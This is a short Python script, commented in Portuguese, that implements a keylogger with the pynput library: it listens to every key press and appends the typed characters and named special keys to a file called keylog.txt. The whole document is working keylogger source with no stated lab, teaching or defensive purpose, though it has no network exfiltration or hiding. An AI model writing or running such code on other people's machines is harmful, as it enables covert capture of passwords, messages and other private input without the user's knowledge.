from pynput.keyboard import Listener
from pynput.keyboard import Key, KeyCode

# Função chamada sempre que uma tecla for pressionada
def on_press(key):
    # Abre o arquivo no modo de adição e grava a tecla pressionada
    with open("keylog.txt", "a") as file:
        if isinstance(key, KeyCode) and key.char is not None:
            # Grava o caractere alfanumérico diretamente
            file.write(key.char)
        elif key == Key.space:
            # Insere um espaço em branco real para a tecla de espaço
            file.write(" ")
        elif key not in {Key.caps_lock, Key.shift, Key.shift_r, Key.ctrl, Key.ctrl_l, Key.ctrl_r, Key.tab, Key.backspace, Key.enter}:
            # Grava outras teclas especiais pelo nome, se disponíveis
            file.write(f'[{key}]')

# Configura o listener de teclado
with Listener(on_press=on_press) as listener:
    listener.join()

# pip install pynput